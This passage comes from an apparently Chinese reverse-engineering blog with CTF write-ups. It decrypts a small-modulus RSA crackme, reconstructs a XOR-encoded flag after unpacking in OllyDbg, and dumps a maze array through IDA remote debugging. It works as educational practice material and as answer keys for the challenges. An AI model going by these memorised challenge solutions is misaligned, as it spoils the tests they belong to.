观察一下规律.</strong></p><h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><p>这道题更像是是crypto的题, 初次了解了下Rsa.</p><p>程序下载下来, 有一系列不认识的函数, 大概知道用法, 还是先取查了查.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503094008020-1590490467616-1591162454456.png" alt="image-20200503094008020-1590490467616"></p><p>GMP(The GNU Multiple Precision Arithmetic Library)又叫GNU多精度算术库，是一个提供了很多操作高精度的大整数，浮点数的运算的算术库，几乎没有什么精度方面的限制，功能丰富. 几个常用的:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">添加头文件：<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;gmp.h&gt; </span></span></span><br><span class="line"></span><br><span class="line">　　cmd编译命令：gcc myprogram.c -lgmp -lm -o myprogram</span><br><span class="line"></span><br><span class="line">　　声明一个gmp的整数rop ：<span class="keyword">mpz_t</span> rop;</span><br><span class="line"></span><br><span class="line">　　把字符串初始化为gmp大整数：<span class="function"><span class="keyword">int</span> <span class="title">mpz_init_set_str</span><span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">char</span>*str, <span class="keyword">int</span> base)</span></span>; </span><br><span class="line"></span><br><span class="line">　　释放空间：<span class="function"><span class="keyword">void</span>  <span class="title">mpz_clear</span><span class="params">(<span class="keyword">mpz_t</span> rop)</span></span>;<span class="comment">//声明了一个变量，在程序的最后一定要释放，不然会报错</span></span><br><span class="line"></span><br><span class="line">　　加法：<span class="function"><span class="keyword">void</span> <span class="title">mpz_add</span><span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">mpz_t</span> op1, <span class="keyword">mpz_t</span> op2)</span></span>;  <span class="comment">//rop = op1 + op2</span></span><br><span class="line"></span><br><span class="line">　　减法：<span class="function"><span class="keyword">void</span> <span class="title">mpz_sub</span><span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">mpz_t</span> op1, <span class="keyword">mpz_t</span> op2)</span></span>;  <span class="comment">//rop = op1 - op2</span></span><br><span class="line"></span><br><span class="line">　　乘法：<span class="function"><span class="keyword">void</span> <span class="title">mpz_mul</span><span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">mpz_t</span> op1, <span class="keyword">mpz_t</span> op2)</span></span>; <span class="comment">//rop = op1 * op2</span></span><br><span class="line"></span><br><span class="line">　　除法：<span class="function"><span class="keyword">void</span> <span class="title">mpz_cdiv_q</span> <span class="params">(<span class="keyword">mpz_t</span> q, <span class="keyword">mpz_t</span> n, <span class="keyword">mpz_t</span> d)</span></span>;  <span class="comment">//q = n/d,这个有很多种类型，具体的看使用手册</span></span><br><span class="line"></span><br><span class="line">　　幂运算：<span class="function"><span class="keyword">void</span> <span class="title">mpz_pow_ui</span> <span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">mpz_t</span> base, <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> <span class="built_in">exp</span>)</span></span>;  <span class="comment">//rop = base^exp</span></span><br><span class="line">  void mpz_powm (mpz_t rop, const mpz_t base, const mpz_t exp, const mpz_t mod)  作用: Set rop to base^exp mod mod. 这是这道题中用到的. 也是rsa加密解密常用的.</span><br><span class="line">          </span><br><span class="line"></span><br><span class="line">　　开方：<span class="function"><span class="keyword">void</span> <span class="title">mpz_sqrt</span> <span class="params">(<span class="keyword">mpz_t</span> rop, <span class="keyword">mpz_t</span> op)</span></span>; <span class="comment">//rop = op开方的向下取整</span></span><br></pre></td></tr></table></figure><p>整个流程, 显然是rsa加密.  </p><table><thead><tr><th align="center">步骤</th><th>说明</th><th>描述</th><th>备注</th></tr></thead><tbody><tr><td align="center">1</td><td>找出质数</td><td>P 、Q</td><td>-</td></tr><tr><td align="center">2</td><td>计算公共模数</td><td>N = P * Q</td><td>-</td></tr><tr><td align="center">3</td><td>欧拉函数</td><td>φ(N) = (P-1)(Q-1)</td><td>-</td></tr><tr><td align="center">4</td><td>计算公钥E</td><td>1 &lt; E &lt; φ(N)</td><td>E的取值必须是整数  E 和 φ(N) 必须是互质数</td></tr><tr><td align="center">5</td><td>计算私钥D</td><td>E * D % φ(N) = 1</td><td>-</td></tr><tr><td align="center">6</td><td>加密</td><td>C ＝ M ^E mod N</td><td>C：密文  M：明文</td></tr><tr><td align="center">7</td><td>解密</td><td>M ＝C ^D mod N</td><td>C：密文  M：明文</td></tr></tbody></table><p>但是之前有一个sub_96A函数.(最上面的箭头所示), 现在进入这个函数看看. 这里是从字符的ASCII转化为16进制, <strong>(最上面的 Windows_Reverse2有从 16进制转化为字符的算法, 都挺简洁的)</strong><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503094306385-1590490481485-1591162474450.png" alt="image-20200503094306385-1590490481485"></p><p>整个程序就是将我们输入的字符, 先转化为16进制数值字符, 再变成一个大数作为明文. 经过  <strong>C ＝ M ^E mod N</strong>, 加密后和编码的密文进行对比. 首先这里的 E = v5 = 65537. M是明文. N = v4 = 103461035900816914121390101299049044413950405173712170434161686539878160984549. 根据解密过程, 我们先把 N 分解成 p q , 可以去在线分解.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503095605681-1590490490248-1591162483535.png" alt="image-20200503095605681-1590490490248"></p><p>然后使用 python的gmpy2库先求逆元得到<strong>D</strong>. 最后用  <strong>M ＝C ^D mod N</strong>  解密并从16进制转化为字符. 这个gmpy2的库的安装还费了些时间..🤣 <strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">N = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">c = <span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">m = gmpy2.powmod(c, d, p*q)</span><br><span class="line"></span><br><span class="line">print(bytes.fromhex(hex(m)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503101307822-1590490496701-1591162599070.png" alt="image-20200503101307822-1590490496701"></p><p><strong>总结: (1)对rsa有了初步的了解, 学会了简单的加密解密方法. (2)GMP算数库的认识. (3)字符的ASCII转16进制的简洁算法.</strong></p><h3 id="BabyXor"><a href="#BabyXor" class="headerlink" title="BabyXor"></a>BabyXor</h3><p>首先, 明明可以直接OD动态调试, 很快得到flag.  但是我用ida把题做完, 才一下子想起.🤣</p><p>发现有壳, 载入OD使用堆栈平衡脱壳. 载入ida, 发现main函数里有很多函数, 上下分析了下, 发现都是干扰的函数. <img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503173759296-1590490519677-1591162520630.png" alt="image-20200503173759296-1590490519677"></p><p>确定目标, 就是通过这几个函数从编码的数据中取出字符经过一些简单的异或运算, 存放再一个内存空间. 但是与我们输入数据没有关系. (这时候, 就可以直接取OD动态调试直接得到flag的, 唉, 我算出来才想起)</p><p>一个疑问的地方<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503174247305-1590490527077-1591162527371.png" alt="image-20200503174247305-1590490527077"></p><p>然后看了看汇编代码. 还是不清楚.  <img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503174332262-1590490532558-1591162533239.png" alt="image-20200503174332262-1590490532558"></p><p>进去OD调试看看.发现代码又是一个样. 不过这下就清楚了. 先取地址的值. <strong>记住这点</strong><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503174534451-1590490539636-1591162540789.png" alt="image-20200503174534451-1590490539636"></p><p>解题脚本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[<span class="number">56</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">14</span>];</span><br><span class="line">&#125;A = &#123;</span><br><span class="line">  <span class="number">102</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">109</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">99</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">100</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">55</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">53</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">48</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">48</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">107</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">58</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">60</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">59</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">32</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida[<span class="number">56</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">14</span>];</span><br><span class="line">&#125; B = &#123;</span><br><span class="line">   <span class="number">55</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">111</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">56</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">98</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">54</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">124</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">55</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">51</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">52</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">118</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">51</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">98</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">100</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">122</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_[<span class="number">56</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">14</span>];</span><br><span class="line">&#125;C = &#123;</span><br><span class="line">   <span class="number">26</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">81</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">17</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">84</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">86</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">85</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">89</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">29</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">93</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">18</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="keyword">char</span> f1[<span class="number">14</span>] = &#123;<span class="number">0</span>&#125;, f2[<span class="number">14</span>] = &#123;<span class="number">0</span>&#125;, f3[<span class="number">14</span>] = &#123;<span class="number">0</span>&#125;, ftemp[<span class="number">14</span>] = &#123;<span class="number">0</span>&#125;, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">f1[i] = A.a[i] ^ i; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f2[<span class="number">0</span>] = B.a[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">14</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">f2[i] = A.a[i] ^ B.a[i] ^ A.a[i<span class="number">-1</span>]; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">13</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">temp = C.a[i+<span class="number">1</span>] ^ f2[i]; </span><br><span class="line">ftemp[i] = temp ^ i;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f3[<span class="number">0</span>] = <span class="number">0x2D</span>;</span><br><span class="line"><span class="built_in">strcat</span>(f3, ftemp);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcat</span>(flag, f1);</span><br><span class="line"><span class="built_in">strcat</span>(flag, f2);</span><br><span class="line"><span class="built_in">strcat</span>(flag, f3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag); </span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503174824411-1590490553835-1591162556782.png" alt="image-20200503174824411-1590490553835"></p><p>下面说一步到位.找到最后一个函数最后赋值代码的地址. 复制下来<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503175027583-1590490558591-1591162567556.png" alt="image-20200503175027583-1590490558591"></p><p>进去OD, 跳到这个地址下断点, 运行起来. 看数据窗口. <img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200503175154926-1590490566331-1591162575032.png" alt="image-20200503175154926-1590490566331"></p><p><strong>总结: (1)注意这种flag和输入字符无关的的题. (2)这里 ida中的内存取值与OD中的差异.</strong></p><h3 id="easy-Maze"><a href="#easy-Maze" class="headerlink" title="easy_Maze"></a>easy_Maze</h3><p>这道题对新手还是很好. </p><p>由题目我们能知道是关于迷宫的题. 下载下来是elf文件, 查壳后无壳, 在linux下运行看看大概流程. </p><p>载入IDA, 先分析了接受我们输入的字符的函数.  知道在外面一层的主函数是先生成一个每行7个元素的数组. 然后通过我们输入的字符按控制在矩阵迷宫中走向, 最后按照规定的到达一个目的地.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200504133456542-1592290152904.png" alt="image-20200504133456542"></p><p>接下来返回外侧的主函数, 就是生成矩阵的了. 通过上面的49个元素知道且下面函数的参数7, 知道规模 7*7. <img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200504133948097-1592290160103.png" alt="image-20200504133948097"></p><p>进入<strong>Step_0</strong> 看看. 就是简单的把上面49个元素赋值给 v7 数组, 也印证了数组是7*7</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200506194728611-1592290641234.png" alt="image-20200506194728611"></p><p>接下来 <strong>Step_1</strong>, 看起来是很简洁, 但里面的 <strong>getA</strong>与 <strong>getAstart</strong> 函数 算法太冗长了.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200506195403856-1592290472100.png" alt="image-20200506195403856"></p><p>这个时候, 开始我就把生成矩阵的所有函数及数据都复制到<strong>VC</strong> 编译器中, 再根据栈的特点改下数据的顺序(<strong>数据存放是从下往上, 那么我们取数据时地址每次减1而不是加一</strong>), 然后运行打印出矩阵. 问题是运行后什么也没有打印, 调试发现一个函数中的内存空间和另外一个冲突, 相互覆盖值. 这个函数太多,关联性大, 改起来也麻烦.</p><p>然后转向GDB调试, 但是不熟练. 又转向ida动态调试. 首先<strong>在 IDA 的安装目录/dbgsrc/找到 linux_server 和 linux_server64 拷贝到 linux</strong> ,在linux中运行 <strong>linux_server64</strong>, 然后在Debugger的 process options 如下图格式配置. 然后F9开始.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200506202545180-1592290263125.png" alt="image-20200506202545180"></p><p>先下断点, 找到储存矩阵的空间的地址, 把这个地址转到数据窗口跟随, 然后运行到生成矩阵的下面一个函数(也就是(<strong>Step_1</strong>下面). 在数据窗口出现我们的数据(int型), 由于是49个元素, 49*4/16 = 12 …4  ,那就是12行加4个数据, <strong>shift+E</strong>提取出C语言格式的数据.<img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200504135411101-1592290168306.png" alt="image-20200504135411101"></p><p>数据得到后, 用C语言打印出来好观察, 注意每个数据4个字节(小端). </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">union</span> <span class="comment">//每个数据4个字节, 且小端. 用联合</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[<span class="number">196</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">49</span>];</span><br><span class="line">&#125;A = &#123;</span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">1</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> (*p)[<span class="number">7</span>] = (<span class="keyword">int</span> (*)[<span class="number">7</span>])A.a;  <span class="comment">// 强制转化为数组指针, 方便后面打印</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">7</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">7</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, p[i][j]);</span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span 